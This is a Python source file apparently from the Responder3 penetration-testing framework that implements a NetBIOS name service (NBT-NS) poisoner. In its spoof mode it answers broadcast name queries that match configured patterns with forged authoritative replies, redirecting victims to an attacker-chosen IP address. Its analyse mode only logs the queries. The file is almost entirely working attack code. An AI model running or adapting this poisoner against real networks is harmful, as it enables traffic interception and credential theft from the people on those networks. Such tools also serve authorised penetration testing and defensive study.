import re
import socket
import struct
import logging
import asyncio
import ipaddress
import traceback
import collections

from responder3.core.commons import *
from responder3.protocols.NetBIOS import * 
from responder3.core.servertemplate import ResponderServer, ResponderServerSession

class NBTNSGlobalSession():
        def __init__(self, server_properties):
                self.server_properties = server_properties
                self.settings = server_properties.settings

                self.spooftable = collections.OrderedDict()
                self.poisonermode = PoisonerMode.ANALYSE

                self.parse_settings()

        def parse_settings(self):
                if self.settings is None:
                        self.log('No settings defined, adjusting to Analysis functionality!')
                else:
                        #parse the poisoner mode
                        if isinstance(self.settings['mode'], str):
                                self.poisonermode = PoisonerMode[self.settings['mode'].upper()]

                        #compiling re strings to actual re objects and converting IP strings to IP objects
                        if self.poisonermode == PoisonerMode.SPOOF:
                                for entry in self.settings['spooftable']:
                                        for regx in entry:
                                                self.spooftable[re.compile(regx)] = ipaddress.ip_address(entry[regx])


class NBTNSSession(ResponderServerSession):
        pass

class NBTNS(ResponderServer):
        def custom_socket(server_properties):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                sock.setblocking(False)#SUPER IMPORTANT TO SET THIS FOR ASYNCIO!!!!
                sock.setsockopt(socket.SOL_SOCKET, 25, server_properties.bind_iface.encode())
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT,1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                sock.bind(('0.0.0.0', server_properties.bind_port)) #only IPv4 is supported, because IPv6 packs it's own DHCP protocol, which is completely different
                return sock

        def init(self):
                self.parser = NBTNSPacket

        @asyncio.coroutine
        def parse_message(self):
                msg = yield from asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
                return msg

        @asyncio.coroutine
        def send_data(self, data, addr = None):
                yield from asyncio.wait_for(self.cwriter.write(data, addr), timeout=1)
                return

        @asyncio.coroutine
        def run(self):
                try:
                        msg = yield from asyncio.wait_for(self.parse_message(), timeout=1)
                        if self.globalsession.poisonermode == PoisonerMode.ANALYSE:
                                for q in msg.Questions:
                                        self.logPoisonResult(requestName = q.QNAME.name)

                        else: #poisoning
                                answers = []
                                for q in msg.Questions:
                                        for spoof_regx in self.globalsession.spooftable:
                                                spoof_ip = self.globalsession.spooftable[spoof_regx]
                                                if spoof_regx.match(q.QNAME.name.lower().strip()):
                                                        self.logPoisonResult(requestName = q.QNAME, poisonName = str(spoof_regx), poisonIP = spoof_ip)
                                                        res = NBResource()
                                                        res.construct(q.QNAME, NBRType.NB, spoof_ip)
                                                        answers.append(res)
                                                        break
                                                else:
                                                        print('RE %s did not match %s' % (spoof_regx, q.QNAME.name))
                                
                                response = NBTNSPacket()
                                response.construct(
                                         TID = msg.NAME_TRN_ID, 
                                         response = NBTSResponse.RESPONSE, 
                                         opcode   = NBTNSOpcode.QUERY, 
                                         nmflags  = NBTSNMFlags.AUTHORATIVEANSWER | NBTSNMFlags.RECURSIONDESIRED, 
                                         answers  = answers
                                )

                                yield from asyncio.wait_for(self.send_data(response.toBytes()), timeout =1)

                except Exception as e:
                        traceback.print_exc()
                        self.log('Exception! %s' % (str(e),))
                        pass
